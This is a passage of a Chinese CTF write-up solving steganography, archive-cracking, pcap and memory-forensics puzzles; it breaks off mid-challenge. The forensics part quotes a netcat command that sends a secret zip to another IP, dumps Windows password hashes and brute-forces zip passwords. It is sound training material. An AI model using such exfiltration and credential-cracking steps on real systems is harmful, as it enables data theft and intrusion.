<html>
<head>
  <title>BMZCTF Misc 4（25-32）</title>
  <basefont face="微软雅黑" size="2" />
  <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
  <meta name="exporter-version" content="YXBJ Windows/605894 (zh-CN, DDL); Windows/6.1.1 (Win64); EDAMVersion=V2;"/>
  <style>
    body, td {
      font-family: 微软雅黑;
      font-size: 10pt;
    }
  </style>
</head>
<body>
<a name="5201"/>
<h1>BMZCTF Misc 4（25-32）</h1>
<h2><a href="https://DemonStarAlgol.github.io/Misc/">[无关链接]</a></h2>

<div>
<span><div><span style="font-weight: bold;">25 2018 HEBTUCTF 句末大佬的lsb</span></div><div><br/></div><div>下载得到png格式文件。根据题目名，可能是LSB隐写，那么就用Stegsolve看一下颜色通道：</div><div><img src="BMZCTF Misc 4（25-32）_files/Image.png" type="image/png" data-filename="Image.png"/></div><div>可以看到R/G/B Plane的左上角都有间隔的黑白点，是很明显的LSB隐写痕迹。</div><div><br/></div><div>但使用Data Extract功能或zsteg工具均无法提取得到有意义的信息，考虑基于LSB隐写的带密码隐写工具，如<a href="https://github.com/livz/cloacked-pixel">cloacked-pixel</a>。这样一来又需要隐写密码，尝试123456等弱密码均无效，通过搜索找到原题的题目内容：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>你知道句末大佬姓什么嘛?知道的话这道题就简单啦!</div></div><div>……不知道大佬贵姓，告辞。</div><div><br/></div><div>总之就只能爆破一下大佬姓什么了，首先准备一份不含标点和换行的百家姓文本，然后写脚本：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>import pypinyin</div><div>import os</div><div><br/></div><div>xing = open('baijiaxing.txt', 'rb').read().decode('utf-8')</div><div>for i in xing[1:]:</div><div>    pw = pypinyin.pinyin(i, style=pypinyin.NORMAL)[0][0]</div><div>    os.system(f'python2 lsb.py extract jumo.png out.txt {pw}')</div><div><br/></div><div>    out = ''</div><div>    try:</div><div>        out = open('out.txt').read()</div><div>    except:</div><div>        pass</div><div>    if '{' in out:</div><div>        print(pw, out)</div><div>        break</div></div><div>在Kali中与cloacked-pixel的lsb.py文件放在同一目录下运行：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>root@kali:~/Desktop/lsb# python3 new.py</div><div>[+] Image size: 580x580 pixels.</div><div>[+] Written extracted data to out.txt.</div><div><span style="font-size: 9pt; color: rgb(51, 51, 51); font-family: Monaco;">……（中略）</span></div><div>[+] Image size: 580x580 pixels.</div><div>[+] Written extracted data to out.txt.</div><div>chen HEBTUCTF{wuinoknadsflmladflnef}</div></div><div>说明大佬姓陈。</div><div><br/></div><div>flag：HEBTUCTF{wuinoknadsflmladflnef}</div><div><br/></div><div><span style="font-weight: bold;">26 [2020首届祥云杯]进制反转</span></div><div><br/></div><div>下载得到rar格式文件。直接打开，其中包含加密的flag.wav，且提示文件头错误：</div><div><img src="BMZCTF Misc 4（25-32）_files/Image [1].png" type="image/png" data-filename="Image.png"/></div><div>这一特征说明该压缩包可能是伪加密。借助010Editor的模板功能找到加密标志位：</div><div><img src="BMZCTF Misc 4（25-32）_files/Image [2].png" type="image/png" data-filename="Image.png"/></div><div>改为0后保存，解压得到flag.wav。</div><div><br/></div><div>直接打开flag.wav继续报错，十六进制编辑器查看，无明显文件头，文件尾有字符串：</div><div><img src="BMZCTF Misc 4（25-32）_files/Image [3].png" type="image/png" data-filename="Image.png"/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>flagisthesong`sname</div></div><div>说明文件是歌曲音频经某种方式转换而来。注意到文件头四个字节AD B6 B9 B9中，三四字节是相同的。联想到wav格式的文件头为RIFF（52 49 46 46），三四字节也是相同的，猜测音频文件经过了单字节密钥的异或加密。验证一下：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>s1 = '52 49 46 46'.split(' ')</div><div>s2 = 'AD B6 B9 B9'.split(' ')</div><div>for i in range(4):</div><div>    print(int(s1[i], 16) ^ int(s2[i], 16))</div></div><div>输出结果均为255，说明每个字节都与0xFF进行了异或。注意到这一运算其实相当于用0xFF减去原字节，或将原字节二进制形式的每一位0或1取反。写脚本恢复原始音频：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>f = open('C:/Users/Administrator/Desktop/flag.wav', 'rb').read()</div><div>res = open('C:/Users/Administrator/Desktop/res.wav', 'ab')</div><div>for i in f:</div><div>    res.write((int(i) ^ 0xFF).to_bytes(1, 'big'))</div></div><div><br/></div><div>播放一下音频，可以感觉出被倒放了。在Audacity中处理，效果-反向（时间）：</div><div><img src="BMZCTF Misc 4（25-32）_files/Image [4].png" type="image/png" data-filename="Image.png"/></div><div>将得到的音频上传至<a href="https://www.aha-music.com/identify-songs-music-recognition-online">在线网站</a>识别歌曲名称：</div><div><img src="BMZCTF Misc 4（25-32）_files/Image [5].png" type="image/png" data-filename="Image.png"/></div><div><br/></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>Title: Too Good At Goodbyes</div></div><div><br/></div><div>flag：BMZCTF{TOOGOODATGOODBYES}</div><div><br/></div><div><span style="font-weight: bold;">27 533</span></div><div><br/></div><div>下载得到加密的zip格式压缩包。根据文件名提示，密码应为9位数字，爆破之：</div><div><img src="BMZCTF Misc 4（25-32）_files/Image [6].png" type="image/png" data-filename="Image.png"/></div><div>解压得到加密的533.zip压缩包，内含三个大小分别为5、3、3字节的txt文本文件：</div><div><img src="BMZCTF Misc 4（25-32）_files/Image [7].png" type="image/png" data-filename="Image.png"/></div><div>CRC32碰撞获得三个文本的内容。先爆破后两个3字节的：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>import binascii, string, itertools</div><div><br/></div><div>dic = string.printable</div><div>crc = ['EAC5C577', '1AA8DB2B']</div><div><br/></div><div>for i in itertools.product(dic, repeat=3):</div><div>    s = ''.join(i)</div><div>    crc32 = hex(binascii.crc32(s.encode())).upper()[2:]</div><div>    if crc32 in crc:</div><div>        print(s, crc32)</div></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>32} 1AA8DB2B</div><div>CRC EAC5C577</div></div><div>再爆破第一个5字节的，但需要适当缩小一点范围：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>import binascii, string, itertools</div><div><br/></div><div>dic = string.ascii_lowercase + '{'</div><div>crc = '5DEC988'</div><div><br/></div><div>for i in itertools.product(dic, repeat=5):</div><div>    s = ''.join(i)</div><div>    crc32 = hex(binascii.crc32(s.encode())).upper()[2:]</div><div>    if crc32 == crc:</div><div>        print(s, crc32)</div></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>flag{ 5DEC988</div></div><div>实际上1.txt的内容完全可以猜到，实际爆破时要根据flag格式缩小字符的取值范围，否则爆破次数会达到100亿级。</div><div><br/></div><div>flag：flag{CRC32}</div><div><br/></div><div><span style="font-weight: bold;">28 pcap_analysis</span></div><div>题目：在工控系统网关截取了一段流量，请分析这段流量并找出其中利用Modbus协议写寄存器的数据。</div><div><br/></div><div>下载得到pcapng格式文件，wireshark打开，筛选Modbus协议：</div><div><img src="BMZCTF Misc 4（25-32）_files/Image [8].png" type="image/png" data-filename="Image.png"/></div><div>追踪TCP流，发现明显的flag格式：</div><div><img src="BMZCTF Misc 4（25-32）_files/Image [9].png" type="image/png" data-filename="Image.png"/></div><div>提取整理后得到flag，当然懒得整理也可以用脚本：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>s = '''</div><div>这</div><div>里</div><div>填</div><div>上</div><div>面</div><div>那</div><div>一</div><div>大</div><div>堆</div><div>东</div><div>西'''</div><div><br/></div><div>for i in s.splitlines():</div><div>    if len(i) &gt; len('.....f5..................!a.....'):</div><div>        print(i[34: 36], end='')</div></div><div><br/></div><div>flag：flag{323f986d429a689d3b96ad12dc5cbc701db0af55}</div><div><br/></div><div><span style="font-weight: bold;">29 MISC_Snake</span></div><div><br/></div><div>下载得到zip格式文件，打开看看：</div><div><img src="BMZCTF Misc 4（25-32）_files/Image [10].png" type="image/png" data-filename="Image.png"/></div><div>注释里有Ook!代码，<a href="https://www.splitbrain.org/services/ook">在线工具</a>处理一下，得到：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>password: doyoulikesnake?</div></div><div><br/></div><div>解压得到snake文件夹，内含data.jpg、data和process三个文件。其中process是一段Python代码：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>data_jpg = open('data.jpg','wb')</div><div>def file_encode():</div><div>    with open('snake.jpg','rb') as handle:</div><div>        i = 1</div><div>        while True:</div><div>            bytedata = handle.read(1)</div><div>            if(bytedata == b''):</div><div>                exit()</div><div>            process_data = data_encode(bytedata)</div><div>            data_write(process_data)</div><div>            i = i + 1</div><div><br/></div><div>def data_encode(bytedata):</div><div>    data = int.from_bytes(bytedata,byteorder='big')</div><div>    if (data % 2 == 0):</div><div>        data = (data + 1) ^ 128</div><div>    else:</div><div>        data = (data - 1) ^ 128</div><div>    data = bytes([data])</div><div>    return data</div><div><br/></div><div>def data_write(process_data):</div><div>    data_jpg.write(process_data)</div><div><br/></div><div>if __name__ == '__main__':</div><div>    file_encode()</div><div>    data_jpg.close()</div></div><div>总之是把某张原始图片逐字节分奇偶加密后得到了data.jpg，那么只需要还原回去即可：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>data = open('C:/Users/Administrator/Desktop/snake/data.jpg', 'rb').read()</div><div>res = open('C:/Users/Administrator/Desktop/snake/snake.jpg', 'ab')</div><div><br/></div><div>for i in data:</div><div>    if i % 2 == 0:</div><div>        res.write(((i ^ 128) + 1).to_bytes(1, 'big'))</div><div>    else:</div><div>        res.write(((i ^ 128) - 1).to_bytes(1, 'big'))</div></div><div>得到snake.jpg：</div><div><img src="BMZCTF Misc 4（25-32）_files/snake.jpg" type="image/jpeg" data-filename="snake.jpg"/></div><div><br/></div><div>Stegsolve查看，在R/G/B Plane 0找到提示文字：</div><div><img src="BMZCTF Misc 4（25-32）_files/Image [11].png" type="image/png" data-filename="Image.png"/></div><div>之前得到的三个文件中，data还没有用到。根据提示，这个文件可能是Serpent加密后的结果，需要找到密钥将其解密。由于没有其他未使用线索，可以猜测密钥很可能也隐写在snake.jpg中。但没有关于隐写方式的提示，只能挨个尝试常见方式和工具，最后发现为steghide：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>D:\CTFToolkit-v1.1.0\信息隐藏\steghide&gt;steghide.exe info snake.jpg</div><div>&quot;snake.jpg&quot;:</div><div>  format: jpeg</div><div>  capacity: 1.8 KB</div><div>Try to get information about embedded data ? (y/n) y</div><div>Enter passphrase:</div><div>  embedded file &quot;key.txt&quot;:</div><div>    size: 15.0 Byte</div><div>    encrypted: rijndael-128, cbc</div><div>    compressed: yes</div></div><div>隐写密码为空，提取隐写信息：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>D:\CTFToolkit-v1.1.0\信息隐藏\steghide&gt;steghide.exe extract -sf snake.jpg</div><div>Enter passphrase:</div><div>wrote extracted data to &quot;key.txt&quot;.</div></div><div>得到key.txt：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>key: VivaLaVida</div></div><div><br/></div><div>最后用<a href="http://serpent.online-domain-tools.com/">在线工具</a>和该密钥解密data文件，</div><div><img src="BMZCTF Misc 4（25-32）_files/Image [12].png" type="image/png" data-filename="Image.png"/></div><div>下载解密结果，是一个仅由w和b两种字符组成的文本：</div><div><img src="BMZCTF Misc 4（25-32）_files/Image [13].png" type="image/png" data-filename="Image.png"/></div><div>容易联想到white和black，文本总长度为40000=200x200，尝试绘制黑白两色图像：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>from PIL import Image</div><div><br/></div><div>s = open('C:/Users/Administrator/Desktop/snake/odt-IV-00000000000000000000000000000000.dat', 'r').read()</div><div>img = Image.new('1', (200, 200))</div><div><br/></div><div>for y in range(200):</div><div>    for x in range(200):</div><div>        img.putpixel((x, y), {'w': 255, 'b': 0}[s[x + y * 200]])</div><div>img.save('C:/Users/Administrator/Desktop/snake/res.png')</div></div><div>得到结果：</div><div><img src="BMZCTF Misc 4（25-32）_files/res.png" type="image/png" data-filename="res.png"/></div><div>扫码得到flag。</div><div><br/></div><div>flag：flag{67bd09fc-e252-4c21-858f-2a7d698d555f}</div><div><br/></div><div><span style="font-weight: bold;">30 内存取证三项</span></div><div>题目：一天下午小白出去吃饭，临走之前还不忘锁了电脑，这时同寝室的小黑想搞点事情，懂点黑客和社工知识的小黑经过多次尝试获得了密码成功进入电脑，于是便悄悄在电脑上动起手脚了，便在桌面上写着什么，想给小白一个惊喜，同时还传送着小白的机密文件，正巧这时小白刚好回来，两人都吓了一跳，小黑也不管自己在电脑上留下的操作急忙离开电脑，故作淡定的说：“我就是随便看看”。</div><div>1.小黑写的啥，据说是flag？</div><div>2.那么问题来了，小白的密码是啥？</div><div>3.小黑发送的机密文件里面到底是什么</div><div><br/></div><div>下载得到raw格式文件，题目已经说了是内存取证，那么就上volatility。先看系统信息：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>root@kali:~/Desktop# volatility imageinfo -f L-12A6C33F43D74-20161114-125252.raw</div><div>Volatility Foundation Volatility Framework 2.6</div><div>INFO    : volatility.debug    : Determining profile based on KDBG search...</div><div>          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)</div><div>                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)</div><div>                     AS Layer2 : FileAddressSpace (/root/Desktop/L-12A6C33F43D74-20161114-125252.raw)</div><div>                      PAE type : PAE</div><div>                           DTB : 0xb18000L</div><div>                          KDBG : 0x80545ce0L</div><div>          Number of Processors : 1</div><div>     Image Type (Service Pack) : 2</div><div>                KPCR for CPU 0 : 0xffdff000L</div><div>             KUSER_SHARED_DATA : 0xffdf0000L</div><div>           Image date and time : 2016-11-14 12:52:58 UTC+0000</div><div>     Image local date and time : 2016-11-14 20:52:58 +0800</div></div><div>确定为32位WinXPSP2系统。根据题目提示，小黑输入的是flag，那么看一下当前打开的记事本窗口内容：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>root@kali:~/Desktop# volatility notepad -f L-12A6C33F43D74-20161114-125252.raw --profile=WinXPSP2x86</div><div>Volatility Foundation Volatility Framework 2.6</div><div>Process: 280</div><div>Text:</div><div>?</div><div><br/></div><div>Text:</div><div>d</div><div><br/></div><div>Text:</div><div><br/></div><div><br/></div><div>Text:</div><div>?</div><div><br/></div><div>Text:</div><div><font style="color: rgb(255, 0, 0);">666C61677B57336C6563306D655F376F5F466F72336E356963737D</font></div></div><div>最后一行十六进制ASCII转码得到：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>flag{W3lec0me_7o_For3n5ics}</div></div><div><br/></div><div>然后是电脑密码，首先<span style="font-size: unset; color: unset; font-family: unset;">导出hash：</span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>root@kali:~/Desktop# volatility hashdump -f L-12A6C33F43D74-20161114-125252.raw --profile=WinXPSP2x86</div><div>Volatility Foundation Volatility Framework 2.6</div><div>Administrator:500:1e27e87bd14ec8af43714428b303e3e4:1e581aafa474dfadfdf83fc31e4fd4ea:::</div><div>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</div><div>HelpAssistant:1000:687255e91a0f559b6d75553dbd51f785:b6125736bdd2d5f154fdce59f52e39f1:::</div><div>SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:fb41f8d1334fba131974c39bfab09512:::</div></div><div>但直接查hash没有结果，上mimikatz：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>root@kali:~/Desktop# volatility mimikatz -f L-12A6C33F43D74-20161114-125252.raw --profile=WinXPSP2x86</div><div>Volatility Foundation Volatility Framework 2.6</div><div>Module   User             Domain           Password                                </div><div>-------- ---------------- ---------------- ----------------------------------------</div></div><div>好的也没有结果，做不来，告辞。</div><div><br/></div><div>最后是机密文件，先看一下进程列表：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>root@kali:~/Desktop# volatility pslist -f L-12A6C33F43D74-20161114-125252.raw --profile=WinXPSP2x86</div><div>Volatility Foundation Volatility Framework 2.6</div><div>Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          </div><div>---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------</div><div>0x80eca020 System                    4      0     59      252 ------      0                                                              </div><div>0x80d98b30 smss.exe                552      4      3       21 ------      0 2016-11-14 12:09:44 UTC+0000                                 </div><div>0xff70e918 csrss.exe               668    552     11      401      0      0 2016-11-14 12:09:47 UTC+0000                                 </div><div>0xff704da0 winlogon.exe            692    552     18      445      0      0 2016-11-14 12:09:48 UTC+0000                                 </div><div>0xff6eb490 services.exe            736    692     16      280      0      0 2016-11-14 12:09:49 UTC+0000                                 </div><div>0xff6e7770 lsass.exe               748    692     21      350      0      0 2016-11-14 12:09:49 UTC+0000                                 </div><div>0xff6d2b48 vmacthlp.exe            900    736      1       24      0      0 2016-11-14 12:09:50 UTC+0000                                 </div><div>0xff6b12c0 svchost.exe             928    736     17      193      0      0 2016-11-14 12:09:50 UTC+0000                                 </div><div>0xff69f1a8 svchost.exe             992    736     10      258      0      0 2016-11-14 12:09:51 UTC+0000                                 </div><div>0xff68d310 svchost.exe            1152    736     64     1217      0      0 2016-11-14 12:09:51 UTC+0000                                 </div><div>0xff6844c0 svchost.exe            1220    736      6       59      0      0 2016-11-14 12:09:51 UTC+0000                                 </div><div>0xff6773c8 svchost.exe            1360    736     14      208      0      0 2016-11-14 12:09:52 UTC+0000                                 </div><div>0xff655498 spoolsv.exe            1560    736     11      130      0      0 2016-11-14 12:09:53 UTC+0000                                 </div><div>0xff63e718 svchost.exe            1692    736      5       87      0      0 2016-11-14 12:10:11 UTC+0000                                 </div><div>0xff6383d0 VGAuthService.e        1756    736      2       61      0      0 2016-11-14 12:10:11 UTC+0000                                 </div><div>0xff61b4d8 vmtoolsd.exe           1932    736      8      251      0      0 2016-11-14 12:10:20 UTC+0000                                 </div><div>0xff5ea6b0 alg.exe                 308    736      6      105      0      0 2016-11-14 12:10:22 UTC+0000                                 </div><div>0xff5e89b0 wmiprvse.exe            316    928     12      233      0      0 2016-11-14 12:10:22 UTC+0000                                 </div><div>0xff5b8a48 explorer.exe           1416   1332     15      446      0      0 2016-11-14 12:10:26 UTC+0000                                 </div><div>0xff583a18 wscntfy.exe            1204   1152      1       44      0      0 2016-11-14 12:10:26 UTC+0000                                 </div><div>0xff56b1b0 rundll32.exe           1744   1416      4       78      0      0 2016-11-14 12:10:28 UTC+0000                                 </div><div>0xff56a3f8 vmtoolsd.exe           1704   1416      6      170      0      0 2016-11-14 12:10:28 UTC+0000                                 </div><div>0xff566da0 ctfmon.exe             1912   1416      1       89      0      0 2016-11-14 12:10:28 UTC+0000                                 </div><div>0x80d4bb28 wpabaln.exe            1992    692      1       66      0      0 2016-11-14 12:12:26 UTC+0000                                 </div><div>0xff5ee020 notepad.exe             280   1416      1       50      0      0 2016-11-14 12:20:27 UTC+0000                                 </div><div><font color="#FF0000">0xff5c5020 cmd.exe                1568   1416      1       34      0      0 2016-11-14 12:23:34 UTC+0000                                 </font></div><div>0xff5b6448 conime.exe              860   1568      1       36      0      0 2016-11-14 12:23:34 UTC+0000                                 </div><div>0x80d4d7f0 wmiprvse.exe            856    928      6      135      0      0 2016-11-14 12:48:39 UTC+0000                                 </div><div>0xff555020 nc.exe                  120   1568      1       34      0      0 2016-11-14 12:50:28 UTC+0000                                 </div><div>0xff65c2a0 DumpIt.exe              392   1416      1       24      0      0 2016-11-14 12:52:52 UTC+0000    </div></div><div>比较可疑的就是nc.exe和cmd.exe，看一下cmd使用情况：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>root@kali:~/Desktop# volatility cmdscan -f L-12A6C33F43D74-20161114-125252.raw --profile=WinXPSP2x86</div><div>Volatility Foundation Volatility Framework 2.6</div><div>**************************************************</div><div>CommandProcess: csrss.exe Pid: 668</div><div>CommandHistory: 0x2da3850 Application: cmd.exe Flags: Allocated, Reset</div><div>CommandCount: 3 LastAdded: 2 LastDisplayed: 2</div><div>FirstCommand: 0 CommandCountMax: 50</div><div>ProcessHandle: 0x3dc</div><div>Cmd #0 @ 0x56af00: ipconfig</div><div>Cmd #1 @ 0x56d650: cd C:\Program Files\Netcat</div><div><font style="color: rgb(255, 0, 0);">Cmd #2 @ 0x2da2e40: nc 192.168.57.14 2333 &lt; P@ssW0rd_is_y0ur_bir7hd4y.zip</font></div><div>**************************************************</div><div>CommandProcess: csrss.exe Pid: 668</div><div>CommandHistory: 0x2dae628 Application: nc.exe Flags: Allocated</div><div>CommandCount: 0 LastAdded: -1 LastDisplayed: -1</div><div>FirstCommand: 0 CommandCountMax: 50</div><div>ProcessHandle: 0x1f0</div><div>Cmd #20 @ 0x180018: .4148</div><div>**************************************************</div><div>CommandProcess: csrss.exe Pid: 668</div><div>CommandHistory: 0x2ddea58 Application: DumpIt.exe Flags: Allocated</div><div>CommandCount: 0 LastAdded: -1 LastDisplayed: -1</div><div>FirstCommand: 0 CommandCountMax: 50</div><div>ProcessHandle: 0x164</div></div><div>很明显这就是在传输的机密文件了，找到这个P@ssW0rd_is_y0ur_bir7hd4y.zip：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>root@kali:~/Desktop# volatility filescan -f L-12A6C33F43D74-20161114-125252.raw --profile=WinXPSP2x86 | grep P@ssW0rd_is_y0ur_bir7hd4y.zip</div><div>Volatility Foundation Volatility Framework 2.6</div><div>0x0000000002c61318      3      1 R--rw- \Device\HarddiskVolume1\Program Files\Netcat\P@ssW0rd_is_y0ur_bir7hd4y.zip</div></div><div>然后将其dump出来：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>root@kali:~/Desktop# volatility dumpfiles -f L-12A6C33F43D74-20161114-125252.raw --profile=WinXPSP2x86 -Q 0x0000000002c61318 -D ./</div><div>Volatility Foundation Volatility Framework 2.6</div><div>DataSectionObject 0x02c61318   None   \Device\HarddiskVolume1\Program Files\Netcat\P@ssW0rd_is_y0ur_bir7hd4y.zip</div><div>SharedCacheMap 0x02c61318   None   \Device\HarddiskVolume1\Program Files\Netcat\P@ssW0rd_is_y0ur_bir7hd4y.zip</div></div><div>打开发现是加密压缩包，根据文件名提示，密码为生日，直接进行8位数字爆破：</div><div><img src="BMZCTF Misc 4（25-32）_files/Image [14].png" type="image/png" data-filename="Image.png"/></div><div>得到密码：</div><div><img src="BMZCTF Misc 4（25-32）_files/Image [15].png" type="image/png" data-filename="Image.png"/></div><div>解压得到P@ssW0rd_is_y0ur_bir7hd4y.txt，内容：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>flag{Thi5_Is_s3cr3t!}</div></div><div><br/></div><div>总之现在有两个flag，都试了试发现可以提交的是最后一个。所以电脑密码到底是多少啊。</div><div><br/></div><div>flag：flag{Thi5_Is_s3cr3t!}</div><div><br/></div><div><span style="font-weight: bold;">31 山东省大学生网络技术大赛-pic</span></div><div><br/></div><div>下载得到png格式文件，zsteg跑一下：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 